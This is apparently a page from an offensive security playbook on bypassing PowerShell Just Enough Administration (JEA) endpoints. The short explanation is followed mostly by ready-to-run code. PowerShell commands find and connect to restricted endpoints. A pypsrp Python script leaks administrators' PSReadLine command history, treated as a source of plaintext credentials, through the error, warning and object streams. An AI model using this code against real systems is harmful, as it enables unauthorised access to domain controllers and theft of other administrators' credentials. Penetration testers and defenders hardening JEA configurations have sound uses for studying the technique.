---
title: "07 · JEA (Just Enough Administration) Bypass"
---

# 07 · JEA (Just Enough Administration) Bypass

> Restricted PowerShell endpoints leak through non-default streams.

> **Phase overview**
>
> JEA endpoints expose a curated subset of PowerShell to admins (think: the helpdesk can restart services but nothing else). They lock down the success stream, what you see when you run a command. But PowerShell has multiple streams (error, warning, verbose, debug, information), and JEA configs frequently filter only the success/output stream. If you can route data through a different stream, you bypass the filter entirely.

### 7.1 · JEA Detection + Stream Bypass

> **Why this works / how it chains**
>
> Connect to the JEA endpoint (note ConfigurationName, not the default). Then test exfil through every stream: throw an exception (error), Write-Warning (warning), or wrap output in a PSCustomObject (object). Most JEA configs only filter the success stream; the others leak data freely. PSReadLine command history is the highest-value target since it often contains plaintext credentials from other admins.

> **What leads here**
>
> - Account has access to a restricted WinRM endpoint
> - JEA configuration_name is not 'Microsoft.PowerShell'
> - Success stream filtered but error/warning/object streams may not be
> - Signs: evil-winrm connects but most cmdlets are restricted

```powershell title="Detect JEA endpoint"
# Some examples:

# Check available endpoints
(Get-PSSessionConfiguration).Name
# If you see non-default endpoint like 'restricted' → JEA

# Connect to JEA endpoint
$cred = New-PSCredential "domain\user" (ConvertTo-SecureString "pass" -AsPlainText -Force)
Enter-PSSession -ComputerName dc1.domain.local `
  -ConfigurationName restricted `
  -Credential $cred

# Check what cmdlets are available
Get-Command
```

```python title="Stream-leak bypass via pypsrp"
# Use pypsrp to test multiple output streams
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan

wsman = WSMan('dc1.domain.local', auth='kerberos', ssl=False,
              negotiate_service='HTTP')

HIST = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"

with RunspacePool(wsman, configuration_name='restricted') as pool:
    # Method 1: throw as exception (error stream)
    ps = PowerShell(pool)
    ps.add_script('&{ $c = Get-Content "' + HIST + '" -Raw; throw $c }')
    ps.invoke()
    for e in ps.streams.error: print(str(e))

    # Method 2: Write-Warning (warning stream - often bypasses filter)
    ps = PowerShell(pool)
    ps.add_script('&{ $c = Get-Content "' + HIST + '" -Raw; Write-Warning $c }')
    ps.invoke()
    for w in ps.streams.warning: print(str(w))

    # Method 3: PSCustomObject (object stream)
    ps = PowerShell(pool)
    ps.add_script('&{ Get-Content "' + HIST + '" | ForEach-Object { [PSCustomObject]@{Name=$_} } }')
    output = ps.invoke()
    for o in output: print(o)
```

```powershell title="PSReadLine history: credential goldmine"
# Check history file first - contains commands with credentials
$HIST = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Get-Content $HIST

# Common finds:
# $cred = New-Object PSCredential("user", (ConvertTo-SecureString "pass" -AsPlainText -Force))
# Enter-PSSession -ComputerName X -Credential $cred
```